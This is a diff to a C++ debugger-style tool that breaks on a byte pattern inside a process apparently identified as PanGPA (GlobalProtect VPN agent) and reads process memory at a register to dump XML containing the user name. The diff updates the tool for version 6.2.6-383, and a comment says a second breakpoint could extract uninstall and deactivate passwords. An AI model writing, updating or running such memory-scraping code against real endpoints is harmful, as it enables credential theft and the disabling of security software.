@@ -81,10 +81,14 @@ void PrintAddressAtRSI(HANDLE hThread) {
     }
 
     if (GetThreadContext(hThread, &context)) {
-        ULONG_PTR rsiAddress = context.Rsi;
-        std::cout << "[*] Address at RSI: " << std::hex << rsiAddress << std::endl;
-
-        DWORD processId = GetProcessIdOfThread(hThread);  
+        //ULONG_PTR rsiAddress = context.Rsi;
+        //RDX for updated version of PanGPA
+        ULONG_PTR rdxAddress = context.Rdx;
+        // Jump back a little to make sure you get the user name
+        rdxAddress = rdxAddress - 100;
+        //std::cout << "[*] Address at RSI: " << std::hex << rsiAddress << std::endl;
+        std::cout << "[*] Address at RDX: " << std::hex << rdxAddress << std::endl;
+        DWORD processId = GetProcessIdOfThread(hThread);
         if (processId == 0) {
             std::cerr << "[!] Failed to get process ID from thread handle. Error: " << GetLastError() << std::endl;
             ResumeThread(hThread);
@@ -101,8 +105,10 @@ void PrintAddressAtRSI(HANDLE hThread) {
         std::vector<BYTE> buffer(0x100);
         SIZE_T bytesRead;
 
-        if (ReadProcessMemory(hProcess, (LPCVOID)rsiAddress, buffer.data(), buffer.size(), &bytesRead)) {
-            std::cout << "[*] Read " << bytesRead << " bytes from address " << std::hex << rsiAddress << ":\n\n";
+        //if (ReadProcessMemory(hProcess, (LPCVOID)rsiAddress, buffer.data(), buffer.size(), &bytesRead)) {
+        //    std::cout << "[*] Read " << bytesRead << " bytes from address " << std::hex << rsiAddress << ":\n\n";
+        if (ReadProcessMemory(hProcess, (LPCVOID)rdxAddress, buffer.data(), buffer.size(), &bytesRead)) {
+            std::cout << "[*] Read " << bytesRead << " bytes from address " << std::hex << rdxAddress << ":\n\n";
             //std::cout << "ASCII output:\n\n";
             prettyPrintXML(buffer, bytesRead);
             //for (size_t i = 0; i < bytesRead; ++i) {
@@ -117,7 +123,8 @@ void PrintAddressAtRSI(HANDLE hThread) {
             std::cout << std::endl;
         }
         else {
-            std::cerr << "[!] Failed to read memory at address: " << std::hex << rsiAddress
+            //std::cerr << "[!] Failed to read memory at address: " << std::hex << rsiAddress
+            std::cerr << "[!] Failed to read memory at address: " << std::hex << rdxAddress
                 << ". Error: " << GetLastError() << std::endl;
         }
 
@@ -129,6 +136,7 @@ void PrintAddressAtRSI(HANDLE hThread) {
 
     return;
 }
+
 
 void DebugProcess(HANDLE hProcess, HANDLE hThread, ULONG_PTR breakpointAddress) {
     DEBUG_EVENT debugEvent;
@@ -289,7 +297,10 @@ int main() {
     std::cout << "[*] Successfully created suspended process with PID: " << pi.dwProcessId << std::endl;
 
     // Define the pattern to search for
-    std::vector<BYTE> pattern = { 0xBA, 0x2A, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0xF8, 0xE8, 0xA3, 0xC8, 0x37, 0x00, 0x48, 0x8D, 0x15 };
+    //std::vector<BYTE> pattern = { 0xBA, 0x2A, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0xF8, 0xE8, 0xA3, 0xC8, 0x37, 0x00, 0x48, 0x8D, 0x15 };
+    //Update for 6.2.6-383
+    std::vector<BYTE> pattern = { 0x48, 0x8D, 0x15, 0x83, 0x77, 0x4F, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x13, 0x70 };
+
     //
     // You can set a second BP here and get the uninstall and deactivate password/codes but currently it faults ¯\_(ツ)_/¯
     // 
